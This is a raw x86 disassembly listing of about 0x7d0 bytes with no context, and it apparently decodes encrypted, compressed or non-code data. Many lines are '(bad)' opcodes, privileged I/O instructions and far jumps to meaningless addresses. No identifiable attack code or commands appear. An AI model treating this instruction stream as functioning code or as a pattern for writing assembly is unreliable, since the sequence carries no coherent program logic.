  41756c:	nop
  41756d:	xchg   edi,eax
  41756e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41756f:	test   DWORD PTR [edi-0x3d6d4864],edi
  417575:	sbb    ecx,ebx
  417577:	arpl   WORD PTR fs:[edi-0x886882c],dx
  41757e:	jl     0x4175d6
  417580:	and    al,0x84
  417582:	daa    
  417583:	popa   
  417584:	iret   
  417585:	cmp    BYTE PTR [esi-0x6c],dl
  417588:	jg     0x417606
  41758a:	add    al,cl
  41758c:	in     al,dx
  41758d:	mov    al,ds:0x16388c8f
  417592:	or     edx,DWORD PTR [ecx+0x67]
  417595:	adc    BYTE PTR [edx],bh
  417597:	aas    
  417598:	cmp    al,0x81
  41759a:	pop    es
  41759b:	push   edi
  41759c:	out    0x66,eax
  41759e:	pushf  
  41759f:	push   esi
  4175a0:	out    dx,al
  4175a1:	sti    
  4175a2:	and    eax,0x38d7836
  4175a7:	sub    eax,0x4519c9ca
  4175ac:	cli    
  4175ad:	adc    eax,0x2cc15a3e
  4175b2:	xlat   BYTE PTR ds:[ebx]
  4175b3:	sub    ebx,DWORD PTR [esi]
  4175b5:	ds push 0x59
  4175b8:	dec    esi
  4175b9:	repz (bad) 
  4175bb:	mov    ch,BYTE PTR [ebx+edi*8]
  4175be:	ins    DWORD PTR es:[edi],dx
  4175bf:	shl    DWORD PTR [esi-0x7bb8c429],1
  4175c5:	sub    BYTE PTR [edx],bl
  4175c7:	jecxz  0x417603
  4175c9:	mov    ds:0xb35f2543,eax
  4175ce:	mov    al,BYTE PTR [edx-0x51ed55b8]
  4175d4:	test   BYTE PTR [edi-0x39],0x77
  4175d8:	or     eax,0x8d5a18f8
  4175dd:	adc    al,0x50
  4175df:	scas   eax,DWORD PTR es:[edi]
  4175e0:	jl     0x41762e
  4175e2:	or     edi,DWORD PTR [esi-0x76]
  4175e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175e6:	lea    ebx,[ebx-0x72196a6e]
  4175ec:	xchg   DWORD PTR [edx-0x23935480],esi
  4175f2:	repnz lds eax,FWORD PTR cs:[esi]
  4175f6:	(bad)  
  4175f7:	loop   0x417675
  4175f9:	pop    eax
  4175fa:	popf   
  4175fb:	sub    al,0x23
  4175fd:	data16 stos BYTE PTR es:[edi],al
  4175ff:	ja     0x417657
  417601:	cmp    ebp,esi
  417603:	cmp    esi,esp
  417605:	xor    al,0xe6
  417607:	aad    0xeb
  417609:	test   eax,0xfa0cdd73
  41760e:	loop   0x4175b7
  417610:	pop    esi
  417611:	lahf   
  417612:	mov    ds:0x5e09aa1f,al
  417617:	int    0x45
  417619:	pushf  
  41761a:	ins    DWORD PTR es:[edi],dx
  41761b:	pop    ebp
  41761c:	and    BYTE PTR ds:0x327b5961,bh
  417622:	cmp    DWORD PTR [edx-0x2487701e],ecx
  417628:	and    eax,0xd8ca79a8
  41762d:	pop    esi
  41762e:	mov    bl,0xff
  417630:	dec    esp
  417631:	dec    edi
  417632:	jmp    0x9b80:0x50db64b9
  417639:	repz fld TBYTE PTR [edi-0xc6ec023]
  417640:	xchg   edi,eax
  417641:	pop    ebp
  417642:	fcmovbe st,st(5)
  417644:	and    dh,bh
  417646:	adc    esp,DWORD PTR [edx]
  417648:	or     dh,0x8a
  41764b:	xchg   edx,eax
  41764c:	idiv   DWORD PTR [eax-0x67]
  41764f:	push   cs
  417650:	xlat   BYTE PTR ds:[ebx]
  417651:	mov    ds:0xb4be5eab,eax
  417656:	das    
  417657:	dec    ecx
  417658:	sbb    edi,DWORD PTR [edi+0x503b06c2]
  41765e:	jae    0x417614
  417660:	xchg   DWORD PTR [ebp-0x57],ebx
  417663:	and    al,0x1c
  417665:	call   0x181b:0x900d6826
  41766c:	ja     0x417675
  41766e:	(bad)  
  41766f:	call   0x6258:0xc36c3f32
  417676:	jns    0x417671
  417678:	lahf   
  417679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41767a:	inc    ecx
  41767b:	mov    dh,0xd
  41767d:	and    al,0xc0
  41767f:	sub    DWORD PTR [eax-0x196beae4],edx
  417685:	cmp    BYTE PTR [ebp+0x543ae86e],dh
  41768b:	icebp  
  41768c:	outs   dx,BYTE PTR ds:[esi]
  41768d:	mov    bh,0x5a
  41768f:	test   DWORD PTR [edx-0x40afa562],edx
  417695:	inc    ebp
  417696:	mov    es,eax
  417698:	cld    
  417699:	int3   
  41769a:	hlt    
  41769b:	outs   dx,DWORD PTR ds:[esi]
  41769c:	cs mov al,0xab
  41769f:	clc    
  4176a0:	inc    eax
  4176a1:	and    DWORD PTR [esi],ebp
  4176a3:	ja     0x417697
  4176a5:	int    0x98
  4176a7:	push   ebx
  4176a8:	dec    DWORD PTR [eax+0x3c86e627]
  4176ae:	aaa    
  4176af:	push   edi
  4176b0:	dec    ebx
  4176b1:	js     0x417711
  4176b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176b4:	or     eax,0xb953e19d
  4176b9:	add    BYTE PTR [eax+edi*4-0x40],0x58
  4176be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176c0:	xor    eax,0x6d568b82
  4176c5:	xchg   esp,eax
  4176c6:	adc    dh,al
  4176c8:	adc    eax,0xd1f6b1df
  4176cd:	mov    DWORD PTR [esi+0x275e7e9d],0xf5abda9d
  4176d7:	lds    ebx,FWORD PTR [esi+0xb]
  4176da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176db:	fs xchg ebx,eax
  4176dd:	fnstenv ds:0xfe8f23ab
  4176e3:	fwait
  4176e4:	jne    0x417746
  4176e6:	shl    BYTE PTR [ebp+0x78fc9609],cl
  4176ec:	call   0xcc1d:0xc00e892f
  4176f3:	fs push edx
  4176f5:	lahf   
  4176f6:	push   ecx
  4176f7:	xchg   ebx,eax
  4176f8:	in     eax,dx
  4176f9:	dec    edi
  4176fa:	dec    edi
  4176fb:	inc    eax
  4176fc:	imul   ebp,DWORD PTR [ebp+ebp*2+0x54f029dc],0xf22b0905
  417707:	adc    eax,0xed2d7aca
  41770c:	jo     0x417777
  41770e:	sbb    esp,ecx
  417710:	dec    ebp
  417711:	dec    eax
  417712:	iret   
  417713:	xchg   edx,eax
  417714:	add    eax,0xda62dc67
  417719:	jp     0x4176dd
  41771b:	jle    0x4176a1
  41771d:	xor    al,BYTE PTR [edi+0x125b4471]
  417723:	repnz outs dx,DWORD PTR ds:[esi]
  417725:	les    ebp,FWORD PTR [edx+0x57fde00e]
  41772b:	in     al,0xe8
  41772d:	ds sbb eax,0x69b8faa0
  417733:	pop    ebx
  417734:	mov    edx,0xfe57301b
  417739:	pop    eax
  41773a:	xchg   ebx,eax
  41773b:	dec    eax
  41773c:	pop    esi
  41773d:	xchg   ebx,eax
  41773e:	inc    edi
  41773f:	xor    eax,0x9c0d1739
  417744:	imul   esp,DWORD PTR ds:0xc139a738,0x2d
  41774b:	jns    0x417765
  41774d:	or     al,0xbe
  41774f:	xchg   edi,eax
  417750:	fwait
  417751:	mov    ebx,0x7059ba5b
  417756:	lods   eax,DWORD PTR ds:[esi]
  417757:	or     BYTE PTR [edx],dh
  417759:	add    eax,0x948ba8c8
  41775e:	data16 icebp 
  417760:	xchg   DWORD PTR [eax],esp
  417762:	xlat   BYTE PTR ds:[ebx]
  417763:	in     eax,dx
  417764:	push   ebp
  417765:	sub    eax,0x4fb13171
  41776a:	test   eax,0x196114c5
  41776f:	pusha  
  417770:	jne    0x4177a6
  417772:	or     eax,0x583c9166
  417777:	adc    edx,DWORD PTR [esi-0x60672f81]
  41777d:	add    DWORD PTR [edx+0x6d],0xffffff8d
  417781:	and    ah,BYTE PTR [ebp-0x47e00545]
  417787:	inc    eax
  417788:	adc    BYTE PTR [ebp+0x4f],0xc3
  41778c:	popf   
  41778d:	leave  
  41778e:	mov    gs,WORD PTR [eax+0x0]
  417791:	jne    0x4177bd
  417793:	ss icebp 
  417795:	rcl    BYTE PTR [esi],cl
  417797:	and    cl,BYTE PTR [esi+0x297b1eae]
  41779d:	cmp    BYTE PTR [esi+esi*8],dl
  4177a0:	adc    ebp,DWORD PTR [eax+0x7599e452]
  4177a6:	sbb    eax,0xe4f3b1f5
  4177ab:	mov    ecx,0x87a9a7a6
  4177b0:	adc    eax,0x8c0312da
  4177b5:	(bad)  
  4177b6:	jp     0x417786
  4177b8:	ret    0x50ef
  4177bb:	sub    eax,0x15d47c8e
  4177c0:	ficom  WORD PTR [ecx]
  4177c2:	mov    eax,0xc9a4789
  4177c7:	or     ecx,0x1c
  4177ca:	inc    ebp
  4177cb:	inc    eax
  4177cc:	mov    ch,0x46
  4177ce:	add    dl,BYTE PTR [edx]
  4177d0:	xchg   DWORD PTR [ebp+0x6bebb1b8],ebx
  4177d6:	mov    ds:0x2694dc43,al
  4177db:	inc    ebx
  4177dc:	ret    0x2c7e
  4177df:	adc    BYTE PTR [ecx-0x44],cl
  4177e2:	test   ecx,0xff33627f
  4177e8:	and    al,0x73
  4177ea:	popa   
  4177eb:	add    eax,0xdf315a2e
  4177f0:	sub    eax,0x6355555f
  4177f5:	xchg   esi,eax
  4177f6:	add    eax,0xc15f143d
  4177fb:	inc    edi
  4177fc:	fsubr  QWORD PTR [edx+ecx*1]
  4177ff:	push   cs
  417800:	mov    BYTE PTR [esi+edi*4+0x18],dl
  417804:	loope  0x4177f9
  417806:	dec    edi
  417807:	je     0x417821
  417809:	or     bh,bl
  41780b:	sub    al,0xe9
  41780d:	ins    DWORD PTR es:[edi],dx
  41780e:	and    DWORD PTR [esi],0x71
  417811:	aas    
  417812:	pop    edx
  417813:	and    ah,BYTE PTR [esi+ebp*1]
  417816:	imul   eax,DWORD PTR [eax-0x67d630d],0x12
  41781d:	hlt    
  41781e:	lds    eax,FWORD PTR [edi+0x75eba4d6]
  417824:	sar    cl,1
  417826:	sbb    eax,0xf857071a
  41782b:	dec    esi
  41782c:	xchg   ebx,eax
  41782d:	dec    eax
  41782e:	lea    ebx,[ebp+eiz*8-0x43164382]
  417835:	clc    
  417836:	retf   0xc793
  417839:	push   0xc1d04b96
  41783e:	push   edx
  41783f:	xor    ebx,DWORD PTR [edi+0x22]
  417842:	push   ds
  417843:	adc    dl,0x89
  417846:	cmp    ebx,DWORD PTR [edx+0x2d]
  417849:	mov    edi,0x8eaa61bb
  41784e:	nop
  41784f:	push   ss
  417850:	sti    
  417851:	adc    eax,edx
  417853:	jl     0x41786f
  417855:	pop    ss
  417856:	mov    edx,0xe94fcbf1
  41785b:	adc    eax,DWORD PTR [ebx-0x4c]
  41785e:	pop    ss
  41785f:	out    dx,eax
  417860:	leave  
  417861:	xchg   DWORD PTR ds:0xdf451ec1,esp
  417867:	gs push es
  417869:	and    DWORD PTR [edx],ebx
  41786b:	(bad)  
  41786c:	mov    ecx,0x5f67d4e9
  417871:	imul   esp,edx,0x44
  417874:	loop   0x4178d4
  417876:	jmp    0x41780a
  417878:	mov    ebp,DWORD PTR [edi+0x24]
  41787b:	xor    edx,DWORD PTR [ebx+0x24c948f7]
  417881:	test   al,0x83
  417883:	push   ebp
  417884:	and    eax,0x495fad40
  417889:	popf   
  41788a:	or     ch,BYTE PTR [edi]
  41788c:	add    edx,DWORD PTR [ebx]
  41788e:	bound  ebp,QWORD PTR [edx]
  417890:	out    dx,eax
  417891:	pop    ebp
  417892:	ins    DWORD PTR es:[edi],dx
  417893:	jnp    0x41790a
  417895:	std    
  417896:	sub    al,0x3a
  417898:	mov    WORD PTR [ecx+0x6e],es
  41789b:	arpl   WORD PTR [eax+0x7c],dx
  41789e:	and    eax,DWORD PTR gs:[eax+0xde9b39e]
  4178a5:	cld    
  4178a6:	jl     0x4178fa
  4178a8:	mov    ds:0x88c7da0,eax
  4178ad:	mov    ds:0x737717c6,al
  4178b2:	(bad)  
  4178b3:	cs or  eax,0xb17b4f83
  4178b9:	icebp  
  4178ba:	add    al,0x53
  4178bc:	nop
  4178bd:	(bad)  
  4178be:	xchg   edx,eax
  4178bf:	add    esi,DWORD PTR [ecx]
  4178c1:	jb     0x4178a7
  4178c3:	xchg   edi,eax
  4178c4:	stos   DWORD PTR es:[edi],eax
  4178c5:	push   0x455ecc68
  4178ca:	cdq    
  4178cb:	ret    0x7547
  4178ce:	rol    DWORD PTR [ebp+0x2a0bd9b5],1
  4178d4:	cmp    dl,BYTE PTR [ecx-0x6d]
  4178d7:	ffree  st(5)
  4178d9:	jecxz  0x417947
  4178db:	cli    
  4178dc:	inc    esp
  4178dd:	adc    DWORD PTR [ebx],esi
  4178df:	xchg   edx,eax
  4178e0:	push   cs
  4178e1:	call   0xf9969311
  4178e6:	rcl    BYTE PTR [ebx+edx*2+0x4a],cl
  4178ea:	nop
  4178eb:	mov    al,ds:0x9312acad
  4178f0:	(bad)  
  4178f1:	leave  
  4178f2:	push   cs
  4178f3:	push   ds
  4178f4:	jl     0x41788c
  4178f6:	dec    ebp
  4178f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178f8:	mov    edi,DWORD PTR [esi]
  4178fa:	rcr    DWORD PTR [eax],cl
  4178fc:	xchg   ecx,eax
  4178fd:	add    eax,esi
  4178ff:	dec    ebx
  417900:	ds mov ebp,0x2ede0f3
  417906:	in     eax,dx
  417907:	hlt    
  417908:	mov    esi,0xc9e5c012
  41790d:	fstp   TBYTE PTR [ebx]
  41790f:	mov    al,ds:0xb635c7fa
  417914:	mov    ebx,0xd542c872
  417919:	push   eax
  41791a:	cli    
  41791b:	sbb    DWORD PTR [ebx+0x3c2025fb],edx
  417921:	dec    eax
  417922:	lahf   
  417923:	aam    0xb5
  417925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417926:	pushf  
  417927:	aas    
  417928:	mov    ebp,0xde4ec62a
  41792d:	imul   ebx,DWORD PTR [ebx-0x28857833],0xcc8ababf
  417937:	sbb    DWORD PTR [esi],ebx
  417939:	sbb    BYTE PTR [ecx-0xa],0x5d
  41793d:	xor    al,0xd6
  41793f:	mov    ebp,0x7bb12936
  417944:	mov    esi,0x1d22c440
  417949:	in     al,0xd0
  41794b:	xor    ch,BYTE PTR [edx]
  41794d:	cmp    bh,cl
  41794f:	jne    0x4179cd
  417951:	test   BYTE PTR [ecx-0x7f],ch
  417954:	out    dx,eax
  417955:	jmp    0xd56861e7
  41795a:	in     eax,dx
  41795b:	ss in  al,dx
  41795d:	in     al,0xed
  41795f:	test   eax,0xcdf93ba0
  417964:	int    0x69
  417966:	pop    esi
  417967:	enter  0x6543,0x7b
  41796b:	cmp    DWORD PTR [esi-0x78],esp
  41796e:	mov    ecx,0x2c7cb23a
  417973:	int3   
  417974:	mov    edx,0x1b9ab081
  417979:	aas    
  41797a:	and    DWORD PTR [edx],edx
  41797c:	push   edx
  41797d:	and    ebx,edx
  41797f:	sahf   
  417980:	push   ecx
  417981:	pop    es
  417982:	mov    bl,0xe3
  417984:	mov    ah,ah
  417986:	jmp    0x578d:0x45c460eb
  41798d:	loope  0x417a08
  41798f:	inc    ecx
  417990:	out    dx,al
  417991:	jge    0x4179a6
  417993:	sub    ecx,ebx
  417995:	pusha  
  417996:	sbb    al,0x8f
  417998:	ss jnp 0x417942
  41799b:	xchg   edx,eax
  41799c:	lahf   
  41799d:	stc    
  41799e:	mov    DWORD PTR [eax-0x78d3c0a2],ebp
  4179a4:	sbb    dh,BYTE PTR [ecx+ebp*2-0x1e]
  4179a8:	dec    ebp
  4179a9:	fstp   TBYTE PTR [edi+0x73b1dfaa]
  4179af:	xchg   ecx,eax
  4179b0:	fsub   DWORD PTR [edx+0x5c]
  4179b3:	mov    ss,WORD PTR [eax]
  4179b5:	enter  0x3cc4,0x8b
  4179b9:	pop    ecx
  4179ba:	popa   
  4179bb:	nop
  4179bc:	xor    edi,DWORD PTR [edx]
  4179be:	sahf   
  4179bf:	inc    edx
  4179c0:	mov    bl,0x1f
  4179c2:	dec    ebx
  4179c3:	sub    eax,0x168e0bf0
  4179c9:	fadd   DWORD PTR [edi-0xb]
  4179cc:	mov    ds:0x9a66f09a,al
  4179d1:	push   ds
  4179d2:	pop    ss
  4179d3:	and    al,0xed
  4179d5:	ret    
  4179d6:	sbb    BYTE PTR [ebx+0x49375dc9],bh
  4179dc:	lea    esp,[esi]
  4179de:	jmp    0x9376e8c4
  4179e3:	clc    
  4179e4:	int3   
  4179e5:	shr    ch,1
  4179e7:	ret    0x885
  4179ea:	rcl    BYTE PTR [eax],1
  4179ec:	mov    eax,ds:0x48885ca4
  4179f1:	jnp    0x417a5c
  4179f3:	test   BYTE PTR [eax],ch
  4179f5:	imul   ecx,DWORD PTR [ecx],0xffffffe5
  4179f8:	or     eax,DWORD PTR [eax-0x7562648]
  4179fe:	rcr    BYTE PTR [esp+ebp*1],cl
  417a01:	sahf   
  417a02:	pop    edi
  417a03:	das    
  417a04:	dec    ebp
  417a05:	ja     0x4179e1
  417a07:	push   eax
  417a08:	stos   DWORD PTR es:[edi],eax
  417a09:	push   esi
  417a0a:	stc    
  417a0b:	lds    esi,FWORD PTR [edx-0x1c]
  417a0e:	loopne 0x4179d7
  417a10:	pop    esi
  417a11:	or     BYTE PTR [esp+eiz*4+0x6df59327],cl
  417a18:	sub    eax,0xffffffdf
  417a1b:	enter  0x4e2,0x76
  417a1f:	fwait
  417a20:	xchg   edi,eax
  417a21:	jae    0x417a06
  417a23:	dec    edi
  417a24:	pop    ebp
  417a25:	retf   
  417a26:	mov    bl,0x38
  417a28:	jae    0x4179d9
  417a2a:	jecxz  0x4179cc
  417a2c:	sbb    BYTE PTR [ecx-0x1391fc8a],cl
  417a32:	out    dx,al
  417a33:	xchg   edx,eax
  417a34:	or     ch,BYTE PTR [edx+0x3557c46d]
  417a3a:	in     al,dx
  417a3b:	aam    0x96
  417a3d:	inc    eax
  417a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a3f:	fistp  WORD PTR [esi+esi*4-0x65]
  417a43:	pop    esi
  417a44:	xor    esp,DWORD PTR [ecx-0x2b]
  417a47:	xor    eax,0x9eb7e71c
  417a4c:	fs jb  0x417a95
  417a4f:	std    
  417a50:	retf   0xdea3
  417a53:	fwait
  417a54:	cmp    al,0x44
  417a56:	imul   edi,ebp,0x33bba656
  417a5c:	inc    edi
  417a5d:	push   ds
  417a5e:	push   eax
  417a5f:	sbb    al,dl
  417a61:	sbb    BYTE PTR [eax-0x44],0xa1
  417a65:	into   
  417a66:	add    DWORD PTR [ecx+0x58fc1341],esp
  417a6c:	into   
  417a6d:	mov    dh,0xf0
  417a6f:	(bad)  
  417a70:	icebp  
  417a71:	jmp    0xbd014684
  417a76:	jns    0x417a32
  417a78:	adc    DWORD PTR ss:[eax+ecx*2-0x78],edi
  417a7d:	push   cs
  417a7e:	sub    esp,ecx
  417a80:	or     al,0xd9
  417a82:	mov    ebx,0xd815f64e
  417a87:	out    0x91,eax
  417a89:	dec    edi
  417a8a:	and    BYTE PTR [esi+0x9fb45c4],al
  417a90:	push   ds
  417a91:	iret   
  417a92:	scas   eax,DWORD PTR es:[edi]
  417a93:	das    
  417a94:	pop    ebx
  417a95:	xchg   dh,bl
  417a97:	(bad)  
  417a98:	mov    esp,0xe8c42d47
  417a9d:	or     ebx,ebp
  417a9f:	sti    
  417aa0:	xchg   ecx,eax
  417aa1:	pop    ebx
  417aa2:	jle    0x417a89
  417aa4:	sahf   
  417aa5:	push   edx
  417aa6:	ret    0xb4d
  417aa9:	add    DWORD PTR [esi+0x59620227],0x5d4171a7
  417ab3:	out    dx,eax
  417ab4:	sti    
  417ab5:	sub    BYTE PTR [edi+0x31fedd2b],bl
  417abb:	aaa    
  417abc:	jb     0x417a9d
  417abe:	iret   
  417abf:	retf   0xf17b
  417ac2:	ret    
  417ac3:	repz push 0xdaf1d6dd
  417ac9:	jo     0x417aa5
  417acb:	push   ss
  417acc:	retf   0xe82a
  417acf:	mov    ebx,0x513fc802
  417ad4:	mov    BYTE PTR [edx+0x73],ch
  417ad7:	nop
  417ad8:	out    dx,al
  417ad9:	pop    ecx
  417ada:	les    esi,FWORD PTR [esi+eax*1-0x31]
  417ade:	mov    ebx,0x789ee452
  417ae3:	pushf  
  417ae4:	pop    edi
  417ae5:	xlat   BYTE PTR ds:[ebx]
  417ae6:	sub    DWORD PTR [ebp+0xc],edx
  417ae9:	cmp    esp,DWORD PTR [ecx+0x18]
  417aec:	sbb    DWORD PTR [ebp+0x2fa0dbf2],eax
  417af2:	(bad)  
  417af3:	aas    
  417af4:	or     al,0x20
  417af6:	pop    esi
  417af8:	sub    dh,al
  417afa:	mov    DWORD PTR [edi-0x55b0acc3],esp
  417b00:	aam    0xbe
  417b02:	clc    
  417b03:	push   cs
  417b04:	cmp    al,0xb2
  417b06:	pop    ebx
  417b07:	inc    ecx
  417b08:	jnp    0x417b54
  417b0a:	pop    ecx
  417b0b:	jge    0x417b61
  417b0d:	shl    BYTE PTR [ebp-0x7],1
  417b10:	mov    ds,WORD PTR [ecx-0x4c92612a]
  417b16:	jmp    DWORD PTR [edi-0x457e8ca4]
  417b1c:	inc    BYTE PTR [edx+ebp*1-0x2b]
  417b20:	hlt    
  417b21:	jb     0x417af3
  417b23:	aaa    
  417b24:	bound  edi,QWORD PTR [esi+0x46bee9d9]
  417b2a:	mov    bl,BYTE PTR [edi+0x4e]
  417b2d:	in     eax,dx
  417b2e:	fisttp QWORD PTR [esi-0x25]
  417b31:	lods   al,BYTE PTR ds:[esi]
  417b32:	inc    edi
  417b33:	push   ebp
  417b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b35:	pop    eax
  417b36:	cmp    al,0x17
  417b38:	mov    al,0xd0
  417b3a:	pushaw 
  417b3c:	pop    eax
  417b3d:	xor    eax,0x4a7c7000
  417b42:	addr16 cwde 
  417b44:	adc    ecx,DWORD PTR [esi-0xc289c42]
  417b4a:	push   eax
  417b4b:	pop    ss
  417b4c:	xchg   DWORD PTR ds:0xbc72e182,esp
  417b52:	inc    ebp
  417b53:	xor    al,0xdc
  417b55:	lea    ebp,[esi-0x348351a5]
  417b5b:	(bad)  
  417b5c:	jg     0x417b06
  417b5e:	sar    DWORD PTR [eax],0xd3
  417b61:	inc    ebp
  417b62:	fiadd  DWORD PTR [ebx+0x7e341a06]
  417b68:	into   
  417b69:	xlat   BYTE PTR ds:[ebx]
  417b6a:	bound  edi,QWORD PTR [edi]
  417b6c:	mov    ecx,0x65635ac0
  417b71:	jo     0x417b95
  417b73:	xor    ah,bl
  417b75:	int    0x76
  417b77:	pop    edx
  417b78:	or     dh,0xf9
  417b7b:	push   ss
  417b7c:	or     eax,0xc29a039a
  417b81:	repnz mov eax,ds:0xc555515e
  417b87:	cmp    al,BYTE PTR [edi-0x4b]
  417b8a:	or     ecx,edi
  417b8c:	daa    
  417b8d:	mov    ds:0x6f8097c4,al
  417b92:	pop    esi
  417b93:	pop    es
  417b94:	lea    ebp,[ebx]
  417b96:	inc    ebx
  417b97:	jge    0x417bc8
  417b99:	sub    al,0x91
  417b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b9c:	xchg   ebx,eax
  417b9d:	xchg   esi,eax
  417b9e:	dec    esi
  417b9f:	fs mov edi,0xaf975365
  417ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ba6:	mov    ah,0xae
  417ba8:	dec    edi
  417ba9:	xor    ebx,esp
  417bab:	fs sahf 
  417bad:	mov    eax,ds:0x58df6236
  417bb2:	stc    
  417bb3:	cmp    eax,0x16c936b4
  417bb8:	nop
  417bb9:	dec    esi
  417bba:	jl     0x417bbe
  417bbc:	adc    eax,0x8897ef1d
  417bc1:	or     al,0xec
  417bc3:	or     ah,BYTE PTR [eax]
  417bc5:	out    0xed,eax
  417bc7:	adc    al,0x9
  417bc9:	adc    al,0x12
  417bcb:	sub    al,0x6
  417bcd:	stc    
  417bce:	iret   
  417bcf:	sbb    DWORD PTR [eax+0x46],0xffffffab
  417bd3:	mov    bl,al
  417bd5:	outs   dx,BYTE PTR ds:[esi]
  417bd6:	inc    esi
  417bd7:	lock cld 
  417bd9:	lods   al,BYTE PTR ds:[esi]
  417bda:	and    edx,DWORD PTR [esi+0x2e]
  417bdd:	sbb    BYTE PTR [ecx-0x1d],0xcd
  417be1:	ja     0x417bc2
  417be3:	sub    eax,DWORD PTR [edi+0x68]
  417be6:	mov    eax,0xf864b330
  417beb:	and    dh,BYTE PTR [ecx-0x8]
  417bee:	cmp    ecx,DWORD PTR [ecx]
  417bf0:	add    al,0x26
  417bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bf3:	and    eax,0x40532f2d
  417bf8:	xchg   ebp,eax
  417bf9:	pop    ecx
  417bfa:	xchg   esi,eax
  417bfb:	clc    
  417bfc:	out    0x7f,al
  417bfe:	aam    0x42
  417c00:	cmp    eax,0x856ea5e2
  417c05:	dec    eax
  417c06:	fldcw  WORD PTR [esp+eiz*2]
  417c09:	sub    dh,BYTE PTR [esi-0x660224c9]
  417c0f:	push   esp
  417c10:	fidiv  WORD PTR [esi+0x3f]
  417c13:	pop    ebx
  417c14:	scas   eax,DWORD PTR es:[edi]
  417c15:	jg     0x417c55
  417c17:	push   cs
  417c18:	xlat   BYTE PTR ds:[ebx]
  417c19:	dec    edx
  417c1a:	adc    DWORD PTR [ecx-0x6f2809a3],edi
  417c20:	(bad)  
  417c21:	mov    ecx,0xfdfabe91
  417c26:	xor    BYTE PTR [edx+0x39b16b21],ch
  417c2c:	adc    DWORD PTR [esi-0x5a],ebp
  417c2f:	cmp    BYTE PTR ds:0x9f27b966,bh
  417c35:	out    0xd3,eax
  417c37:	xor    eax,0xb74fa1fd
  417c3c:	stos   DWORD PTR es:[edi],eax
  417c3d:	mov    esi,0xb8df55de
  417c42:	(bad)  
  417c43:	scas   al,BYTE PTR es:[edi]
  417c44:	and    ah,BYTE PTR [eax+0x53d7345a]
  417c4a:	pop    es
  417c4b:	lods   al,BYTE PTR ds:[esi]
  417c4c:	call   0xd08:0x9e90d7b8
  417c53:	jnp    0x417c40
  417c55:	jns    0x417be3
  417c57:	jb     0x417c2d
  417c59:	push   0x6b7aadec
  417c5e:	hlt    
  417c5f:	mov    cl,0xb0
  417c61:	fiadd  WORD PTR [eax]
  417c63:	(bad)  
  417c64:	retf   
  417c65:	hlt    
  417c66:	retf   
  417c67:	sar    BYTE PTR [esi+0x41574584],1
  417c6d:	icebp  
  417c6e:	cmp    edx,DWORD PTR ds:0xf15a3bb9
  417c74:	xchg   esp,eax
  417c75:	add    DWORD PTR [eax],esp
  417c77:	jo     0x417cc6
  417c79:	stos   DWORD PTR es:[edi],eax
  417c7a:	in     eax,0x8c
  417c7c:	fisttp QWORD PTR [ecx]
  417c7e:	or     eax,DWORD PTR [edx-0x3bf008e5]
  417c84:	ret    0x901f
  417c87:	inc    eax
  417c88:	jbe    0x417cee
  417c8a:	pop    edi
  417c8b:	fmul   DWORD PTR [esi-0x4d]
  417c8e:	push   edx
  417c8f:	xchg   esi,eax
  417c90:	shr    esp,0xa3
  417c93:	jp     0x417d03
  417c95:	dec    eax
  417c96:	adc    BYTE PTR [ecx+0x33],ch
  417c99:	pop    esi
  417c9a:	ss pop edi
  417c9c:	in     al,0xcf
  417c9e:	cmp    eax,0x496b1e9e
  417ca3:	xchg   ecx,eax
  417ca4:	xchg   ebx,edx
  417ca6:	jg     0x417c31
  417ca8:	mov    dh,ah
  417caa:	sub    DWORD PTR [eax-0x77229c6d],edx
  417cb0:	jge    0x417c97
  417cb2:	imul   esi,DWORD PTR [ebp-0x15dcd078],0x44
  417cb9:	fld    TBYTE PTR [esi]
  417cbb:	popf   
  417cbc:	dec    ebp
  417cbd:	test   eax,0xe8914e6b
  417cc2:	mov    ds:0xfd164fdf,al
  417cc7:	inc    ebp
  417cc8:	sub    DWORD PTR [edi+0x44],ebp
  417ccb:	pop    edi
  417ccc:	inc    ecx
  417ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cce:	push   edi
  417ccf:	leave  
  417cd0:	test   al,0xc3
  417cd2:	xor    al,0xab
  417cd4:	pop    edi
  417cd5:	fiadd  DWORD PTR [eax+edi*4]
  417cd8:	pop    esp
  417cd9:	je     0x417c9e
  417cdb:	gs call 0x1ac9:0x46a58529
  417ce3:	adc    esp,DWORD PTR [esp+ebx*2-0x1af73b07]
  417cea:	xchg   esp,eax
  417ceb:	shl    BYTE PTR [edx+0x46],0x7c
  417cef:	pusha  
  417cf0:	test   al,0x6a
  417cf2:	cmp    ah,BYTE PTR [ebx-0x13]
  417cf5:	data16 cmc 
  417cf7:	cs and eax,0x68ee79f5
  417cfd:	and    ch,ch
  417cff:	rcl    DWORD PTR [ebx+0x5d],1
  417d02:	js     0x417cd0
  417d04:	dec    eax
  417d05:	jne    0x417d3d
  417d07:	sbb    ah,BYTE PTR [edx+ebp*8-0x70]
  417d0b:	imul   DWORD PTR [ecx+ecx*4+0x7a03fe8a]
  417d12:	int3   
  417d13:	xchg   DWORD PTR [edx+0x2a2a283a],esi
  417d19:	or     ebx,edi
  417d1b:	pop    ebx
  417d1c:	les    edi,FWORD PTR [ecx]
  417d1e:	ss mul bh
  417d21:	gs loopne 0x417d32
  417d24:	xor    edi,ebp
  417d26:	test   BYTE PTR [ecx-0x2a],0xcd
  417d2a:	xlat   BYTE PTR ds:[ebx]
  417d2b:	sub    ebx,DWORD PTR [esi]
  417d2d:	jg     0x417da5
  417d2f:	lea    esi,[ebp+0x7c]
  417d32:	dec    edx
  417d33:	pop    esp
  417d34:	xor    al,0x77
  417d36:	and    esp,DWORD PTR [edx]
  417d38:	bound  eax,QWORD PTR ds:0x4f814fa2
